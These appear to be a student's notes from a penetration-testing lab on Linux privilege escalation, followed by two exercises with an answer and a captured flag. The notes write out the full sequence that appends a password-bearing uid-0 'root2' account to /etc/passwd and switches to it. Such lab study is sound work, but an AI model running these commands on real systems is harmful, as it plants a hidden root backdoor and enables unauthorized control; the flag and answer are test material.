openssl passwd w00t

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2

w00t

id

1. Connect to VM 1 and repeat the steps discussed in this section in order to obtain a root shell. Which hashing algorithm has been used to encrypt the attacker's password?

[crypt algorithm](https://en.wikipedia.org/wiki/Crypt_\(C\))

1. Connect to VM 2 and get the flag by elevating to a root shell through password authentication abuse.

OS{eaae7e792fbf5d57bacf0125ba52dbb0}